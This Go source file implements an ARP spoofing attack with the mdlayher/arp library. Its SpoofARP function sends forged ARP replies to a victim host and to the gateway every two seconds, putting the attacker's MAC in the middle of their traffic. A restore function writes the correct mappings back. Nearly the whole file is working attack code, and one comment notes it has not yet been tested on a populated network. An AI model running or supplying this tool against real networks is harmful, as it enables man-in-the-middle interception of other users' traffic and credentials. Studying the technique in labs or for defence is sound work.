package spoof

import (
	"log"
	"net"
	"net/netip"
	"time"

	"github.com/mdlayher/arp"
)

// func SpoofARP(ifi *net.Interface, victimIP, gatewayIP net.IP, attackMAC, victimMAC net.HardwareAddr) error {
func SpoofARP(ifi *net.Interface, victim, gateway net.IP, attackMAC, victimMAC, gatewayMAC net.HardwareAddr) error {
	c, err := arp.Dial(ifi)
	if err != nil {
		return err
	}
	defer c.Close()

	victimIP, err := netipIP(&victim)
	if err != nil {
		return err
	}
	gatewayIP, err := netipIP(&gateway)
	if err != nil {
		return err
	}

	for {
		log.Printf("Spoofing [%s] through [%s]\n", victimIP.String(), gatewayIP.String())

		// TODO:
		// test this out when on a populated network

		packForVictim := &arp.Packet{
			Operation:          arp.OperationReply,
			SenderHardwareAddr: attackMAC,
			SenderIP:           *gatewayIP,
			TargetHardwareAddr: victimMAC,
			TargetIP:           *victimIP,
		}

		c.WriteTo(packForVictim, victimMAC)

		packForRouter := &arp.Packet{
			Operation:          arp.OperationReply,
			SenderHardwareAddr: attackMAC,
			SenderIP:           *victimIP,
			TargetHardwareAddr: gatewayMAC, // there should be the router mac
			TargetIP:           *gatewayIP,
		}

		c.WriteTo(packForRouter, gatewayMAC)

		time.Sleep(2 * time.Second)
	}
}

func RestoreArpTables(ifi *net.Interface, victim, gateway net.IP, victimMAC, gatewayMAC net.HardwareAddr) {
	c, err := arp.Dial(ifi)
	if err != nil {
		log.Fatal(err)
	}
	defer c.Close()

	victimIP, err := netipIP(&victim)
	if err != nil {
		log.Fatal(err)
	}
	gatewayIP, err := netipIP(&gateway)
	if err != nil {
		log.Fatal(err)
	}

	c.WriteTo(&arp.Packet{
		Operation:          arp.OperationReply,
		SenderHardwareAddr: gatewayMAC,
		SenderIP:           *gatewayIP,
		TargetHardwareAddr: victimMAC,
		TargetIP:           *victimIP,
	}, victimMAC)

	c.WriteTo(&arp.Packet{
		Operation:          arp.OperationReply,
		SenderHardwareAddr: victimMAC,
		SenderIP:           *victimIP,
		TargetHardwareAddr: gatewayMAC, // there should be the router mac
		TargetIP:           *gatewayIP,
	}, gatewayMAC)

	log.Println("ARP Tables have been restored. Exiting ...")
}

func netipIP(ip *net.IP) (*netip.Addr, error) {
	addr, err := netip.ParseAddr(ip.String())
	if err != nil {
		return nil, err
	}

	byt := addr.As4()
	ret := netip.AddrFrom4(byt)
	return &ret, nil
}
